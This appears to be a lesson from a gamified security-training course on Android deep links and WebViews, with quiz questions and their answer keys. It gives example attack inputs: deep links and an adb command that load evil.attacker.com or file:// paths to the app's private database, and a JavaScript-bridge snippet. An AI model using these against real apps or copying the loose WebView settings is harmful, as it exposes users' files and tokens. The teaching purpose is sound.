---
slug: "mobile-deep-links-and-webviews"
title: "Deep Links and WebViews"
kingdom: "mobile"
place: "emerald-docks"
order: 2
xp: 280
difficulty: 3
minutes: 35
requires: []
skills: ["xss", "idor"]
attributes: { exploitation: 2, logic: 2 }
summary: "A link that opens the app, and a browser embedded inside it. A deep link carries attacker data into the app; a misconfigured WebView carries the web's whole bug catalogue into the phone."
---

Two features bridge the outside world into the app and reward a hunter richly. A **deep link** lets any web page or app open a specific screen in the app and hand it data. A **WebView** is a browser embedded inside the app, and when it is configured loosely it drags XSS, local-file theft, and even native code execution onto the device.

## The link that carries your data in

The app registers a scheme — `myapp://` — so a link opens it at a chosen screen with parameters attached:

```
myapp://open?screen=webview&url=https://evil.attacker.com
adb shell am start -a android.intent.action.VIEW -d "myapp://open?url=https://evil.attacker.com"
```

If the app trusts a `url` parameter and loads it, or trusts an `id` and shows that record, the deep link is attacker-controlled input into the app — reachable by getting a victim to tap a link. Every parameter a deep link accepts is a field to tamper.

```question
id: deep-link
prompt: A deep link myapp://open?url=... causes the app to load whatever URL you put in the parameter. Since a victim only has to tap your link for this to reach the app, what is the deep link acting as?
answer: attacker-controlled input
accept: [attacker-controlled input, untrusted input, a source of input, attacker input, external input into the app, a way to pass data into the app]
hint: It is an entry point for data you choose, delivered by a tapped link.
```

## The browser inside the app

A WebView renders web content inside the app. The dangerous switches:

- `setJavaScriptEnabled(true)` — needed for many apps, but now any page it loads can run script.
- Loading a URL from a deep link or an unvalidated source — so *your* page runs in the WebView, with whatever access the app granted it.
- `setAllowFileAccess(true)` / `file://` loading — letting a loaded page read the app's local files, stealing tokens and databases.

Combine the deep link and a loose WebView — `myapp://open?url=file:///data/data/com.app/databases/` — and the attacker's context reads the app's private storage.

```question
id: webview-file
prompt: An app's WebView has file access enabled and loads a URL from a deep link. You pass a file:// URL pointing at the app's private database. What does the loosely-configured WebView let your loaded page do?
answer: read local files
accept: [read local files, read the app's files, steal local files, access private storage, read the database, read app storage, access local files]
hint: File access plus an attacker-chosen URL means the page reads the device's files.
```

## The bridge to native code

The sharpest WebView bug is `addJavascriptInterface`: it exposes an Android object's methods to the JavaScript running in the WebView. If your page runs in that WebView, it calls native code — historically a path to full remote code execution on the device:

```java
webView.addJavascriptInterface(new NativeBridge(), "Android");
// in the page: Android.readFile("/etc/hosts")  — JS now calls native
```

```question
id: js-bridge
prompt: A WebView uses addJavascriptInterface to expose native Android methods to the JavaScript it runs. If an attacker gets their page loaded in that WebView, what can their JavaScript now do that ordinary web JavaScript cannot?
answer: call native code
accept: [call native code, execute native methods, run native code, reach native functions, call android methods, invoke native code, code execution]
hint: The bridge lets the page's JS invoke the app's native methods.
```

## The same XSS, on the phone

Any content a WebView renders unescaped is XSS — but here the impact is not a session cookie, it is access to the app's storage and, through a bridge, the device. WebView XSS is web XSS with a native blast radius.

```question
id: webview-xss
prompt: A WebView displays user-controlled content without escaping, so you inject a script that runs inside it. This is the same bug as web XSS, but what makes it more dangerous inside a mobile WebView?
answer: it can reach the device
accept: [it can reach the device, access to the app's files, it reaches native features, access to local storage and the bridge, a native blast radius, it can read app data or call native code, more access than a browser]
hint: Inside the app, the script may reach files, storage, and any exposed native bridge.
```

> A deep link is a tapped link that carries your data into the app; a WebView is a browser whose loose settings let your page read the device's files or call its native code. Follow the deep link into the WebView, and the whole web bug catalogue lands with a native blast radius.
